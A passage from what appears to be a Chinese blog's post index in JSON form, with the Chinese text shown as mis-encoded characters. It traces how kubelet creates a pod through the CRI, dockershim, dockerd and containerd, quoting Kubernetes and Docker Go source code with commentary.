æˆ‘ä»¬ç†Ÿæ‚‰çš„è°ƒç”¨ cotnainer çš„ task å¯åŠ¨åˆ›å»º contianer\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to create containerd task&quot;)\t&#125;\tdefer func() &#123; if retErr != nil &#123; deferCtx, deferCancel := ctrdutil.DeferContext() defer deferCancel() // Cleanup the sandbox container if an error is returned. if _, err := task.Delete(deferCtx, containerd.WithProcessKill); err != nil &amp;&amp; !errdefs.IsNotFound(err) &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to delete sandbox container %q&quot;, id) &#125; &#125;\t&#125;()\t// wait is a long running background request, no timeout needed.\texitCh, err := task.Wait(ctrdutil.NamespacedContext()) // ç­‰å¾… task å®Œæˆ\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to wait for sandbox container task&quot;)\t&#125;\tif err := task.Start(ctx); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to start sandbox container task %q&quot;, id)\t&#125;\tif err := sandbox.Status.Update(func(status sandboxstore.Status) (sandboxstore.Status, error) &#123; // Set the pod sandbox as ready after successfully start sandbox container. status.Pid = task.Pid() status.State = sandboxstore.StateReady status.CreatedAt = info.CreatedAt return status, nil\t&#125;); err != nil &#123; return nil, errors.Wrap(err, &quot;failed to update sandbox status&quot;)\t&#125;\t// Add sandbox into sandbox store in INIT state.\tsandbox.Container = container\tif err := c.sandboxStore.Add(sandbox); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to add sandbox %+v into store&quot;, sandbox)\t&#125;\t// start the monitor after adding sandbox into the store, this ensures\t// that sandbox is in the store, when event monitor receives the TaskExit event.\t//\t// TaskOOM from containerd may come before sandbox is added to store,\t// but we don&#x27;t care about sandbox TaskOOM right now, so it is fine.\tc.eventMonitor.startExitMonitor(context.Background(), id, task.Pid(), exitCh)\treturn &amp;runtime.RunPodSandboxResponse&#123;PodSandboxId: id&#125;, nil&#125; æœ‰äº† dockershim ä¸Šæ¬¡çš„åŸºç¡€ï¼Œè¿™æ¬¡å†çœ‹ containerd ä¸­ä¸åŒæ’ä»¶ä¹‹é—´è°ƒç”¨å°±è¦ç®€å•çš„å¤šï¼Œè¿‡å¤šç»†èŠ‚ä¸åœ¨èµ˜è¿°ã€‚","tags":["k8s"]},{"title":"kubelet æ˜¯å¦‚ä½•å¯åŠ¨ POD","path":"/2020/12/15/kubelet-create-pod/","content":"å‡ºäº containerd ä¸Šçº¿éœ€æ±‚ï¼Œèµ°è¯»çº¿ä¸Šç»„ä»¶çš„ä»£ç ç¡®å®šç°æœ‰ POD åˆ›å»ºæµç¨‹ï¼Œä¸»è¦å…³æ³¨çš„æ˜¯ç»„ä»¶ä¹‹é—´æ˜¯å¦‚ä½•äº¤äº’æ²Ÿé€šçš„è¿›è¡Œ POD åˆ›å»ºçš„ã€‚ kubelet-create-pod kubelet kubelet å¦‚ä½•åˆ›å»º POD dockershim dockerd æ¥å£ &#x2F;containers&#x2F;{name:.*}&#x2F;start containerd ContainersServer.Create æ–¹æ³•çš„å®ç° TasksServer.Create æ–¹æ³•çš„å®ç° TasksServer.Start æ–¹æ³•çš„å®ç° containerd-shim çš„å¦‚ä½•å·¥ä½œ contained-shim create contained-shim start runc run create â€“bundle runc init runc start kubeletçº¿ä¸Šä¸»è¦æœ‰ä¸¤ä¸ªç‰ˆæœ¬çš„ k8sï¼Œè¿™æ¬¡ä»£ç èµ°è¯»ä¸»è¦å…³æ³¨ 1.17.4 ç‰ˆæœ¬ã€‚è§‚å¯Ÿ kubelet åˆå§‹åŒ–æµç¨‹å¯ä»¥çœ‹åˆ°ä¸è¿è¡Œæ—¶ç›¸å…³å‚æ•°å¦‚ä¸‹--container-runtime= å‚æ•°ä¸º dockerã€‚æŸ¥çœ‹å¯åŠ¨æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ° kubelet å¯åŠ¨äº†ä¸€ä¸ª dockershim çš„æœåŠ¡ï¼Œè¿™ä¸ªæœåŠ¡å°±æ˜¯ç›®å‰è°ƒç ”çš„ä¸€ä¸ªå…³é”®ç‚¹ï¼Œå› ä¸ºç¤¾åŒºåœ¨ 1.20 ç‰ˆæœ¬ä¸­å‡†å¤‡å¼ƒç”¨ dockershim äº†ã€‚ 1234I1215 16:38:23.359299 2052022 docker_service.go:274] Setting cgroupDriver to cgroupfsI1215 16:38:23.359435 2052022 kubelet.go:642] Starting the GRPC server for the docker CRI shim.I1215 16:38:23.359456 2052022 docker_server.go:59] Start dockershim grpc server... è°ƒç ”ç¤¾åŒºæ–‡æ¡£å‘ç°ï¼Œdockershim ä¹‹æ‰€ä»¥è¢«æå‡ºæ˜¯ä¸ºäº†è§£å†³ kubernetes å¼€å‘è€…é¢ä¸´å¤šä¸ªruntimeéƒ½è¦æ¥å…¥kuberneteså¯¼è‡´è°ƒç”¨è¿è¡Œæ—¶çš„ç›¸å…³ä»£ç æ¥å£ä¸ç¨³å®šçš„é—®é¢˜ã€‚å¼€å‘è€…å¼•å…¥ä¸€ä¸ªæŠ½è±¡å±‚å¯¹ä¸Šå±è”½åº•å±‚çš„runtimeå®ç°å·®å¼‚ï¼Œè¿™ä¸ªæŠ½è±¡å±‚ç§°ä¸ºCRI, è¿™é‡Œçš„ dockershim å°±æ˜¯åŸºäº docker äºŒæ¬¡å°è£…çš„ä¸€ä¸ª CRI å®ç°ã€‚shim è¿™ä¸ªå•è¯çš„ç”±æ¥å¯ä»¥ä» wiki ä¸ŠæŸ¥åˆ° an application compatibility workaroundã€‚ kubelet å¦‚ä½•åˆ›å»º PODåœ¨ POD åˆ›å»ºè¿‡ç¨‹ä¸­é¦–å…ˆéœ€è¦å‡†å¤‡ä¸€ä¸ªè¢«æˆä¸º sandbox çš„å®¹å™¨ç”¨æ¥åˆå§‹åŒ–è®¾ç½®åŸºç¡€ç½‘ç»œç­‰ç­‰è¯¸å¤šäº‹å®œã€‚èµ°è¯» CRI æ¥å£å‘ç°åˆ›å»º Sandbox è¿™ä¸ªæ˜¯ CRI çš„ä¸€ä¸ªé‡è¦åŠŸèƒ½ã€‚ åŸºäº kubelet çš„æºç åˆ†æï¼Œé€šè¿‡æºç åˆ†æäº†è§£åˆ° syncLoopIteration -&gt; HandlePodAdditions -&gt; dispatchWork-&gt;UpdatePod-&gt; managePodLoop è¿™æ ·çš„ä¸€ä¸ªå‡½æ•°è°ƒç”¨å…³ç³»ã€‚ 12345678910func (p *podWorkers) managePodLoop(podUpdates &lt;-chan UpdatePodOptions) &#123;\tvar lastSyncTime time.Time... err = p.syncPodFn(syncPodOptions&#123; // å°±æ˜¯è¿™ä¸ª syncPodFn å‡½æ•°çš„å®ç° mirrorPod: update.MirrorPod, pod: update.Pod, podStatus: status, killPodOptions: update.KillPodOptions, updateType: update.UpdateType, &#125;) å…¶ä¸­çš„ syncPodFn å…·ä½“å®ç°æ˜¯ klet.syncPod å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä»£ç klet.podWorkers = newPodWorkers(klet.syncPod, kubeDeps.Recorder, klet.workQueue, klet.resyncInterval, backOffPeriod, klet.podCache)çœ‹å‡ºã€‚åŸºäºä»¥ä¸Šä¿¡æ¯å¯ä»¥æ¨è®ºå‡º podWorkers æ‰æ˜¯ pod åˆ›å»ºçš„æ ¸å¿ƒã€‚èµ°è¯»wokerçš„ SyncPod è¿™ä¸ªå‡½æ•°å°±æ˜¯å°±æ˜¯ podWorkers æ ¸å¿ƒæµç¨‹äº†ï¼Œworker é€šè¿‡ sync å‡½æ•°æ¥è°ƒç”¨å„ä¸ª CRI æ¥å£å°†è¿™äº›åŸå­æ¥å£ç»„è£…æˆä¸€ä¸ªä¸ªå®é™…çš„ kubernetes çš„ PODã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// SyncPod syncs the running pod into the desired pod by executing following steps://// 1. Compute sandbox and container changes.// 2. Kill pod sandbox if necessary.// 3. Kill any containers that should not be running.// 4. Create sandbox if necessary.// 5. Create ephemeral containers.// 6. Create init containers.// 7. Create normal containers.func (m *kubeGenericRuntimeManager) SyncPod(pod *v1.Pod, podStatus *kubecontainer.PodStatus, pullSecrets []v1.Secret, backOff *flowcontrol.Backoff) (result kubecontainer.PodSyncResult) &#123;\t// Step 1: Compute sandbox and container changes.\tpodContainerChanges := m.computePodActions(pod, podStatus) // è¿˜æ˜¯å£°æ˜å¼ api æ¨¡å‹ï¼Œå°†æ“ä½œåºåˆ—åŒ–...\t// Step 2: Kill the pod if the sandbox has changed.\tif podContainerChanges.KillPod &#123;... killResult := m.killPodWithSyncResult(pod, kubecontainer.ConvertPodStatusToRunningPod(m.runtimeName, podStatus), nil)... // åˆ é™¤ä¸€ä¸‹æ— å…³ç´§è¦çš„ä»£ç ï¼Œä¸å½±å“ä¸»çº¿é€»è¾‘\t&#125; else &#123; // Step 3: kill any running containers in this pod which are not to keep. for containerID, containerInfo := range podContainerChanges.ContainersToKill &#123; klog.V(3).Infof(&quot;Killing unwanted container %q(id=%q) for pod %q&quot;, containerInfo.name, containerID, format.Pod(pod)) killContainerResult := kubecontainer.NewSyncResult(kubecontainer.KillContainer, containerInfo.name) result.AddSyncResult(killContainerResult) if err := m.killContainer(pod, containerID, containerInfo.name, containerInfo.message, nil); err != nil &#123;...// ä¸€äº›åœ¨è¿è¡Œï¼Œä½†æ˜¯åº”è¯¥è¢«åˆ é™¤çš„ container å¤„ç†é€»è¾‘ï¼Œ &#125; &#125;\t&#125;... // Step 4: Create a sandbox for the pod if necessary.\tpodSandboxID := podContainerChanges.SandboxID\tif podContainerChanges.CreateSandbox &#123;... createSandboxResult := kubecontainer.NewSyncResult(kubecontainer.CreatePodSandbox, format.Pod(pod)) result.AddSyncResult(createSandboxResult) podSandboxID, msg, err = m.createPodSandbox(pod, podContainerChanges.Attempt) // è¿™ä¸ªå‡½æ•°æ˜¯æˆ‘ä»¬å…³æ³¨çš„æ ¸å¿ƒï¼Œå‡†å¤‡ pod çš„æ²™ç›’ï¼Œå¦‚ä½•åœ¨ sandbox ä¸­è°ƒç”¨ CNI è®¾ç½®ç½‘ç»œ/å­˜å‚¨ç­‰... // åˆ é™¤ä¸€ä¸‹é”™è¯¯å¤„ç†ï¼Œäº‹ä»¶çš„é€»è¾‘ï¼Œç½‘ç»œç›¸å…³ï¼Œä¸å½±å“å¯åŠ¨ä¸€ä¸ªä¸ä½¿ç”¨ç½‘ç»œçš„ container ğŸ˜„ // Get podSandboxConfig for containers to start.\tconfigPodSandboxResult := kubecontainer.NewSyncResult(kubecontainer.ConfigPodSandbox, podSandboxID)\tresult.AddSyncResult(configPodSandboxResult)\tpodSandboxConfig, err := m.generatePodSandboxConfig(pod, podContainerChanges.Attempt)\tif err != nil &#123; message := fmt.Sprintf(&quot;GeneratePodSandboxConfig for pod %q failed: %v&quot;, format.Pod(pod), err) klog.Error(message) configPodSandboxResult.Fail(kubecontainer.ErrConfigPodSandbox, message) return\t&#125;\t// Helper containing boilerplate common to starting all types of containers.\t// typeName is a label used to describe this type of container in log messages,\t// currently: &quot;container&quot;, &quot;init container&quot; or &quot;ephemeral container&quot;\tstart := func(typeName string, container *v1.Container) error &#123; startContainerResult := kubecontainer.NewSyncResult(kubecontainer.StartContainer, container.Name) result.AddSyncResult(startContainerResult) isInBackOff, msg, err := m.doBackOff(pod, container, podStatus, backOff) if isInBackOff &#123; startContainerResult.Fail(err, msg) klog.V(4).Infof(&quot;Backing Off restarting %v %+v in pod %v&quot;, typeName, container, format.Pod(pod)) return err &#125; klog.V(4).Infof(&quot;Creating %v %+v in pod %v&quot;, typeName, container, format.Pod(pod)) // NOTE (aramase) podIPs are populated for single stack and dual stack clusters. Send only podIPs. if msg, err := m.startContainer(podSandboxID, podSandboxConfig, container, pod, podStatus, pullSecrets, podIP, podIPs); err != nil &#123; // åˆ›å»º cotnainer å’Œ å¯åŠ¨ container æ˜¯ä¸¤å›äº‹ï¼Œåˆ›å»ºè¯´çš„æ˜¯å‡†å¤‡å¥½ç›¸å…³åº•å±‚æ–‡ä»¶èµ„æºï¼Œå¯åŠ¨å°±æ˜¯ä»¥è¿›ç¨‹å½¢å¼åœ¨ OS å¯è§ï¼Œå…·ä½“è¿˜è¦çœ‹åº•å±‚è¿è¡Œæ—¶æ˜¯å¦‚ä½•å®ç°çš„ã€‚ // .. åˆ é™¤äº†ä¸€éƒ¨åˆ†é”™è¯¯å¤„ç†çš„é€»è¾‘ // Step 5: start ephemeral containers\t// è¿™éƒ¨åˆ†é€»è¾‘éä¸»çº¿\t// Step 6: start the init container.\tif container := podContainerChanges.NextInitContainerToStart; container != nil &#123; // Start the next init container. if err := start(&quot;init container&quot;, container); err != nil &#123; return &#125; // Successfully started the container; clear the entry in the failure klog.V(4).Infof(&quot;Completed init container %q for pod %q&quot;, container.Name, format.Pod(pod))\t&#125;\t// Step 7: start containers in podContainerChanges.ContainersToStart. for _, idx := range podContainerChanges.ContainersToStart &#123; // å°±æ˜¯ä¸šåŠ¡çš„ container start(&quot;container&quot;, &amp;pod.Spec.Containers[idx]) // start å¯ä»¥å‰é¢çœ‹åˆ°å®šä¹‰ start := func(typeName string, container *v1.Container) &#125;\treturn&#125; ä¸Šé¢çš„æºç å…¶å®å·²ç»çŸ¥é“ä¸ºä»€ä¹ˆè¦å¼•å…¥ sandbox container äº†ã€‚åˆ†æä¸€ä¸‹ createPodSandbox è¿™ä¸ªå‡½æ•°æ˜¯å¦‚ä½•å®ç°çš„ã€‚ 12345678910111213141516171819// createPodSandbox creates a pod sandbox and returns (podSandBoxID, message, error).func (m *kubeGenericRuntimeManager) createPodSandbox(pod *v1.Pod, attempt uint32) (string, string, error) &#123;\tpodSandboxConfig, err := m.generatePodSandboxConfig(pod, attempt)\tif err != nil &#123; message := fmt.Sprintf(&quot;GeneratePodSandboxConfig for pod %q failed: %v&quot;, format.Pod(pod), err) klog.Error(message) return &quot;&quot;, message, err\t&#125;\t// Create pod logs directory\terr = m.osInterface.MkdirAll(podSandboxConfig.LogDirectory, 0755) // è¿™ä¸ªç›®å½•å°±æ˜¯ kubelet é…ç½®è¯»å–ä¸‹æ¥çš„\tif err != nil &#123; message := fmt.Sprintf(&quot;Create pod log directory for pod %q failed: %v&quot;, format.Pod(pod), err)... // çœç•¥é”™è¯¯å¤„ç†\t... // åˆ é™¤äº†éä¸»çº¿é€»è¾‘\tpodSandBoxID, err := m.runtimeService.RunPodSandbox(podSandboxConfig, runtimeHandler)... // çœç•¥é”™è¯¯å¤„ç†\treturn podSandBoxID, &quot;&quot;, nil&#125; è¿™å°±æ˜¯çœ‹åˆ°è°ƒç”¨çš„ func (in instrumentedRuntimeService) RunPodSandboxha å‡½æ•°åŸºæœ¬æ˜¯é€ä¼ ï¼Œå­˜ç²¹æ˜¯ä¸ºäº†è®°å½•ä¸€ä¸‹ metric ä¸ºç›‘æ§æœåŠ¡ã€‚ 1234567891011func (in instrumentedRuntimeService) RunPodSandbox(config *runtimeapi.PodSandboxConfig, runtimeHandler string) (string, error) &#123;\tconst operation = &quot;run_podsandbox&quot;\tstartTime := time.Now()\tdefer recordOperation(operation, startTime)\tdefer metrics.RunPodSandboxDuration.WithLabelValues(runtimeHandler).Observe(metrics.SinceInSeconds(startTime))\tout, err := in.service.RunPodSandbox(config, runtimeHandler)\trecordError(operation, err)\tif err != nil &#123; metrics.RunPodSandboxErrors.WithLabelValues(runtimeHandler).Inc()... åœ¨ä¸Šé¢è®°å½•å®Œæˆç›‘æ§ç›¸å…³è¿‡åï¼Œä¸‹é¢å°±æ˜¯å‡†å¤‡è°ƒç”¨ grpc æœåŠ¡äº†ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨çš„æ˜¯ CRI çš„ /runtime.v1alpha2.RuntimeService/RunPodSandbox æ¥å£ã€‚ 123456789101112131415// RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure// the sandbox is in ready state.func (r *RemoteRuntimeService) RunPodSandbox(config *runtimeapi.PodSandboxConfig, runtimeHandler string) (string, error) &#123;\t// Use 2 times longer timeout for sandbox operation (4 mins by default)\t// TODO: Make the pod sandbox timeout configurable.\tctx, cancel := getContextWithTimeout(r.timeout * 2)\tdefer cancel()\tresp, err := r.runtimeClient.RunPodSandbox(ctx, &amp;runtimeapi.RunPodSandboxRequest&#123; Config: config, RuntimeHandler: runtimeHandler,\t&#125;)...\treturn resp.PodSandboxId, nil&#125; 12345678func (c *runtimeServiceClient) RunPodSandbox(ctx context.Context, in *RunPodSandboxRequest, opts ...grpc.CallOption) (*RunPodSandboxResponse, error) &#123;\tout := new(RunPodSandboxResponse)\terr := c.cc.Invoke(ctx, &quot;/runtime.v1alpha2.RuntimeService/RunPodSandbox&quot;, in, out, opts...)\tif err != nil &#123; return nil, err\t&#125;\treturn out, nil&#125; ä»¥ä¸Šå°±æ˜¯ kubeGenericRuntimeManager æ‰€å¤„ç†çš„ POD åˆ›å»ºæµç¨‹ä¸­çš„ sandbox çš„éƒ¨åˆ†ï¼Œå¯¹å…¶ sandbox å…·ä½“æ˜¯å¦‚ä½•è¢«åˆ›å»ºçš„æ›´å¤šç»†èŠ‚å°±è¦çœ‹ grpc æœåŠ¡ç«¯çš„å®ç°äº†ã€‚ dockershimå‰é¢æ¢³ç†å‡ºæ¥äº† kubeGenericRuntimeManager æ˜¯å¦‚ä½•é€šè¿‡SyncPodå®ç°PODçš„åˆ›å»ºï¼Œä½†æ˜¯ä¹Ÿå‘ç°ä»–çš„å®ç°å®Œå…¨æ˜¯é¢å‘æ¥å£çš„ï¼Œå®Œå…¨ä¸å…³å¿ƒåº•å±‚æ˜¯å¦‚ä½•å®ç° cotnainer çš„ã€‚æˆ‘ä»¬æ¥ç€ä¸Šé¢ client çš„ç›¸å…³é€»è¾‘èµ°è¯»ä¸€ä¸‹/runtime.v1alpha2.RuntimeService/RunPodSandbox çš„æœåŠ¡ç«¯ä»£ç é€»è¾‘ã€‚ 123456789var _RuntimeService_serviceDesc = grpc.ServiceDesc&#123;\tServiceName: &quot;runtime.v1alpha2.RuntimeService&quot;,\tHandlerType: (*RuntimeServiceServer)(nil),\tMethods: []grpc.MethodDesc&#123;... &#123; MethodName: &quot;RunPodSandbox&quot;, Handler: _RuntimeService_RunPodSandbox_Handler,... ä¸‹é¢æ˜¯ handler æ³¨å†Œçš„è¿‡ç¨‹ï¼Œå…¶å®éƒ½æ˜¯æœºå™¨ç”Ÿæˆçš„ä»£ç æ²¡æœ‰å•¥å¥½çœ‹çš„ã€‚ 1234567891011121314func _RuntimeService_RunPodSandbox_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor grpc.UnaryServerInterceptor) (interface&#123;&#125;, error) &#123;\tin := new(RunPodSandboxRequest)\tif err := dec(in); err != nil &#123; return nil, err\t&#125;\tif interceptor == nil &#123; return srv.(RuntimeServiceServer).RunPodSandbox(ctx, in)\t&#125;\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/runtime.v1alpha2.RuntimeService/RunPodSandbox&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(RuntimeServiceServer).RunPodSandbox(ctx, req.(*RunPodSandboxRequest)) è¿™é‡Œå°±æ˜¯ dockershim å®ç°çš„ CRIï¼Œèµ°è¯»ä¸Šä¸‹æ–‡ä»£ç çŸ¥é“äº† ds.client.StartContainer() ä¸­çš„ client æ˜¯ libdocker ä¸­ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨çš„ dockerClientã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure// the sandbox is in ready state.// For docker, PodSandbox is implemented by a container holding the network// namespace for the pod.// Note: docker doesn&#x27;t use LogDirectory (yet).func (ds *dockerService) RunPodSandbox(ctx context.Context, r *runtimeapi.RunPodSandboxRequest) (*runtimeapi.RunPodSandboxResponse, error) &#123;\tconfig := r.GetConfig()\t// Step 1: Pull the image for the sandbox.\timage := defaultSandboxImage // è¿™é‡Œå°±æ˜¯ Google çš„é‚£ä¸ª sandbox çš„ image\tpodSandboxImage := ds.podSandboxImage\tif len(podSandboxImage) != 0 &#123; image = podSandboxImage\t&#125;\t// NOTE: To use a custom sandbox image in a private repository, users need to configure the nodes with credentials properly.\t// see: http://kubernetes.io/docs/user-guide/images/#configuring-nodes-to-authenticate-to-a-private-repository\t// Only pull sandbox image when it&#x27;s not present - v1.PullIfNotPresent.\tif err := ensureSandboxImageExists(ds.client, image); err != nil &#123; return nil, err\t&#125;\t// Step 2: Create the sandbox container.\tif r.GetRuntimeHandler() != &quot;&quot; &amp;&amp; r.GetRuntimeHandler() != runtimeName &#123; return nil, fmt.Errorf(&quot;RuntimeHandler %q not supported&quot;, r.GetRuntimeHandler())\t&#125;\tcreateConfig, err := ds.makeSandboxDockerConfig(config, image)\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to make sandbox docker config for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\tcreateResp, err := ds.client.CreateContainer(*createConfig) // è¿™é‡Œçš„åˆ›å»º sandbox æ˜¯å¤‡å¥½ container éœ€è¦åº•å±‚èµ„æº\tif err != nil &#123; createResp, err = recoverFromCreationConflictIfNeeded(ds.client, *createConfig, err)\t&#125;\tif err != nil || createResp == nil &#123; return nil, fmt.Errorf(&quot;failed to create a sandbox for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\tresp := &amp;runtimeapi.RunPodSandboxResponse&#123;PodSandboxId: createResp.ID&#125;\tds.setNetworkReady(createResp.ID, false)\tdefer func(e *error) &#123; // Set networking ready depending on the error return of // the parent function if *e == nil &#123; ds.setNetworkReady(createResp.ID, true) &#125;\t&#125;(&amp;err)\t// Step 3: Create Sandbox Checkpoint.\tif err = ds.checkpointManager.CreateCheckpoint(createResp.ID, constructPodSandboxCheckpoint(config)); err != nil &#123; return nil, err // ç›®å‰æ¥çœ‹ checkpoint åŠŸèƒ½å¥½åƒå¹¶æ²¡æœ‰å¤§è§„æ¨¡ä½¿ç”¨ï¼Ÿä¸è¿‡è¿™ä¸ªå¯¹æˆ‘ä»¬è¿™æ¬¡çœ‹ pod åˆ›å»ºæµç¨‹æ— å…³ç»éªŒ\t&#125;\t// Step 4: Start the sandbox container.\t// Assume kubelet&#x27;s garbage collector would remove the sandbox later, if\t// startContainer failed.\terr = ds.client.StartContainer(createResp.ID) // å‰é¢å‡†å¤‡å¥½ container è¿™é‡Œæ‰å»å¯åŠ¨ï¼Œå…·ä½“æ€ä¹ˆå¯åŠ¨ kubelet å¹¶ä¸å…³å¿ƒ\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to start sandbox container for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\t// åˆ é™¤äº†ä¸€ä¸‹ç½‘ç»œå’Œå®‰å…¨ç›¸å…³ä»£ç å’Œæ ¸å¿ƒæµç¨‹æ— å…³\t// Step 5: Setup networking for the sandbox.\t// All pod networking is setup by a CNI plugin discovered at startup time.\t// This plugin assigns the pod ip, sets up routes inside the sandbox,\t// creates interfaces etc. In theory, its jurisdiction ends with pod\t// sandbox networking, but it might insert iptables rules or open ports\t// on the host as well, to satisfy parts of the pod spec that aren&#x27;t\t// recognized by the CNI standard yet.\tcID := kubecontainer.BuildContainerID(runtimeName, createResp.ID)\tnetworkOptions := make(map[string]string)\tif dnsConfig := config.GetDnsConfig(); dnsConfig != nil &#123; // Build DNS options. dnsOption, err := json.Marshal(dnsConfig) if err != nil &#123; return nil, fmt.Errorf(&quot;failed to marshal dns config for pod %q: %v&quot;, config.Metadata.Name, err) &#125; networkOptions[&quot;dns&quot;] = string(dnsOption)\t&#125; // CRI è°ƒç”¨ CNI æ¥è®¾ç½® POD çš„åŸºç¡€ç½‘ç»œ\terr = ds.network.SetUpPod(config.GetMetadata().Namespace, config.GetMetadata().Name, cID, config.Annotations, networkOptions) // åˆ é™¤äº†ä¸€éƒ¨åˆ†è®¾ç½®å®¹å™¨ç½‘ç»œé”™è¯¯çš„å¤„ç†æµç¨‹å’Œæ ¸å¿ƒæµç¨‹æ— å…³\treturn resp, nil&#125; èµ°è¯»çš„ dockershim çš„ RunPodSandbox æ¥å£å‘ç°ï¼Œå®ƒè°ƒç”¨äº† docker çš„æ¥å£ ds.client.CreateContainer(*createConfig) åˆ›å»ºäº† cotnainer, åˆä½¿ç”¨äº† ds.client.StartContainer(createResp.ID) å¯åŠ¨åˆšåˆšåˆ›å»ºçš„ cotnainerã€‚åœ¨å¾€ä¸‹é¢å®ç°å°±éœ€è¦å»èµ°è¯» dockerd çš„ä»£ç äº†ã€‚ 12345678910111213141516func (ds *dockerService) RunPodSandbox(ctx context.Context, r *runtimeapi.RunPodSandboxRequest) (*runtimeapi.RunPodSandboxResponse, error) &#123;\tconfig := r.GetConfig()...\tcreateConfig, err := ds.makeSandboxDockerConfig(config, image)\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to make sandbox docker config for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125;\tcreateResp, err := ds.client.CreateContainer(*createConfig) // è¿™é‡Œçš„åˆ›å»º sandbox æ˜¯å¤‡å¥½ container éœ€è¦åº•å±‚èµ„æº...\t// Step 4: Start the sandbox container.\t// Assume kubelet&#x27;s garbage collector would remove the sandbox later, if\t// startContainer failed.\terr = ds.client.StartContainer(createResp.ID) // å‰é¢å‡†å¤‡å¥½ container è¿™é‡Œæ‰å»å¯åŠ¨ï¼Œå…·ä½“æ€ä¹ˆå¯åŠ¨ kubelet å¹¶ä¸å…³å¿ƒ\tif err != nil &#123; return nil, fmt.Errorf(&quot;failed to start sandbox container for pod %q: %v&quot;, config.Metadata.Name, err)\t&#125; è¿™é‡Œä¸»è¦å…³æ³¨ ds.client.StartContainer()ï¼Œæ˜¯å› ä¸º ds.client.CreateContainer(*createConfig) çš„é€»è¾‘æ¯”è¾ƒç®€å•ã€‚ 1resp, err := cli.post(ctx, &quot;/containers/&quot;+containerID+&quot;/start&quot;, query, nil, nil) é€šè¿‡å¯¹ä»£ç çš„åˆ†æå‘ç° StartContainer æœ€åå‘å‡ºçš„æ˜¯ http è¯·æ±‚ã€‚ dockerd æ¥å£&#x2F;containers&#x2F;{name:.*}&#x2F;startåŸºäºå‰é¢çš„åˆ†ææˆ‘å·²ç»çŸ¥é“ kubelet çš„ dockershim å…¶å®ä½¿ç”¨è°ƒç”¨çš„ docker çš„ resftul apiï¼Œæ ¹æ®çº¿ä¸Š docker çš„ç‰ˆæœ¬ä¿¡æ¯ 18.09.9 checkoutç›¸å¯¹åº”çš„ä»£ç ã€‚å¯ä»¥å‘ç° container æµç¨‹ç›¸å…³çš„é€»è¾‘åœ¨ docker/api/server/router/container/container.go çš„ initRoutes() ä¸­ã€‚ 1router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/start&quot;, r.postContainersStart), ä¸Šé¢æ˜¯ handler ä¸»è¦é€»è¾‘å¾ˆç®€å•ï¼Œä¸‹é¢å°±æ˜¯å¯åŠ¨ container çš„æ ¸å¿ƒæµç¨‹äº†ã€‚ 1234567891011func (s *containerRouter) postContainersStart(ctx context.Context, w http.ResponseWriter, r *http.Request, vars map[string]string) error &#123;\t// If contentLength is -1, we can assumed chunked encoding\t// or more technically that the length is unknown\t// https://golang.org/src/pkg/net/http/request.go#L139\t// net/http otherwise seems to swallow any headers related to chunked encoding\t// including r.TransferEncoding\t// allow a nil body for backwards compatibility\t// ç§»é™¤ http æ£€æŸ¥ç›¸å…³é€»è¾‘ï¼Œå“ªäº›ä¸å½±å“æ ¸å¿ƒ\tif err := s.backend.ContainerStart(vars[&quot;name&quot;], hostConfig, checkpoint, checkpointDir); err != nil &#123; // here ... 12345// ContainerStart starts a container.func (daemon *Daemon) ContainerStart(name string, hostConfig *containertypes.HostConfig, checkpoint string, checkpointDir string) error &#123;// åˆ é™¤å¤§é‡çš„ä¿æŠ¤å¼ç¼–ç¨‹éæ ¸å¿ƒé€»è¾‘ä»£ç \treturn daemon.containerStart(container, checkpoint, checkpointDir, true) // here&#125; è·Ÿå¦‚è¿™ä¸ªStartå‡½æ•°å‘ç°å±…ç„¶æ˜¯ä½¿ç”¨ grpc å»è°ƒç”¨/containerd.services.tasks.v1.Tasks/Startçš„æ¥å£ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940// containerStart prepares the container to run by setting up everything the// container needs, such as storage and networking, as well as links// between containers. The container is left waiting for a signal to// begin running.func (daemon *Daemon) containerStart(container *container.Container, checkpoint string, checkpointDir string, resetRestartManager bool) (err error) &#123;\tstart := time.Now()\tcontainer.Lock()\tdefer container.Unlock()\t// åˆ é™¤é”™è¯¯å¤„ç†ä¸ä¸€ä¸‹é˜²å¾¡ç¼–ç¨‹\tif err := daemon.conditionalMountOnStart(container); err != nil &#123; return err\t&#125;\tif err := daemon.initializeNetworking(container); err != nil &#123; return err\t&#125;\tspec, err := daemon.createSpec(container)\tif err != nil &#123; return errdefs.System(err)\t&#125;// åˆ é™¤ä¸€ä¸‹éæ ¸å¿ƒåŠŸèƒ½ä»£ç \tcreateOptions, err := daemon.getLibcontainerdCreateOptions(container)\tif err != nil &#123; return err\t&#125;\tctx := context.TODO()\terr = daemon.containerd.Create(ctx, container.ID, spec, createOptions) // è¿™é‡Œæœ€ç»ˆä¼šè°ƒç”¨ cotnainerd çš„ create\t// åˆ é™¤é”™è¯¯å¤„ç†ç›¸å…³ä»£ç \t// TODO(mlaventure): we need to specify checkpoint options here\tpid, err := daemon.containerd.Start(context.Background(), container.ID, checkpointDir, // 